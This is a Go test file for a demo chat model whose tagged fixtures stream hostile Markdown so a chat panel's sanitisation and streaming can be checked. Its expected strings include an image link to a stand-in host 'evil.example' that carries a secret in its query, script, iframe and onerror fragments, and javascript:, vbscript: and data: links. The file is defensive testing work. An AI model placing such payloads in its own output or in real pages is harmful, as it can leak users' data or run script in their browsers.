package ai

import (
	"context"
	"strings"
	"testing"

	"github.com/hostrepute/reputecast/internal/ai/llm"
)

// The demo's fixtures (B6, development only): a tag answers with hostile
// Markdown, line by line, so the panel's rendering can be checked in a
// browser; "#long" streams words that are all different, for timing.
func TestDemoFixtures(t *testing.T) {
	every := demoDeltaEvery
	demoDeltaEvery = 0
	t.Cleanup(func() { demoDeltaEvery = every })
	ask := func(q string) (llm.Response, []string) {
		t.Helper()
		var pieces []string
		req := llm.Request{Messages: []llm.Message{{Role: "user", Parts: []llm.Part{{Text: q}}}}}
		res, err := demoModel{}.Stream(context.Background(), req, func(d llm.Delta) error {
			pieces = append(pieces, d.Text)
			return nil
		})
		if err != nil {
			t.Fatalf("%s: %v", q, err)
		}
		if strings.Join(pieces, "") != res.Text {
			t.Fatalf("%s: the pieces don't add up to the answer", q)
		}
		return res, pieces
	}

	res, pieces := ask("Show me everything #hostile")
	for _, want := range []string{
		"![chart](https://evil.example/pixel.png?d=SECRET-INLINE)", "[logo]: https://evil.example/ref.png", "<https://evil.example/auto", "[![badge](",
		"<script>", "onerror=", "<iframe", "(javascript:", "(JaVaScRiPt:", "(data:text/html", "(vbscript:",
		"{{ \"<img", "```liquid", "| Column 24 |", "| r50c24 |", strings.Repeat("A", 3000),
	} {
		if !strings.Contains(res.Text, want) {
			t.Errorf("#hostile lacks %q", want)
		}
	}
	if !strings.HasSuffix(res.Text, "End of the hostile sample.") || len(pieces) < 50 {
		t.Errorf("#hostile: %d pieces, ends %q", len(pieces), res.Text[len(res.Text)-30:])
	}
	// A table's row and the long line each arrive in one piece.
	for _, p := range pieces {
		if strings.Contains(p, "r7c1 ") && !strings.Contains(p, "r7c24") {
			t.Errorf("a table row was split: %q", p)
		}
	}

	// One fixture answers alone.
	res, _ = ask("Links only #hostile-links")
	if !strings.Contains(res.Text, "(vbscript:") || strings.Contains(res.Text, "evil.example/pixel") {
		t.Errorf("#hostile-links answered %q", res.Text)
	}

	res, pieces = ask("Time the panel #long")
	if !strings.Contains(res.Text, "w001") || !strings.Contains(res.Text, "w360") || strings.Count(res.Text, "w180") != 1 || len(pieces) < 100 {
		t.Errorf("#long: %d pieces", len(pieces))
	}

	// Without a tag the recorded answer stands.
	res, _ = ask("What can you do?")
	if !strings.Contains(res.Text, "recorded answer") || strings.Contains(res.Text, "evil.example") {
		t.Errorf("the recorded answer changed: %q", res.Text)
	}
}
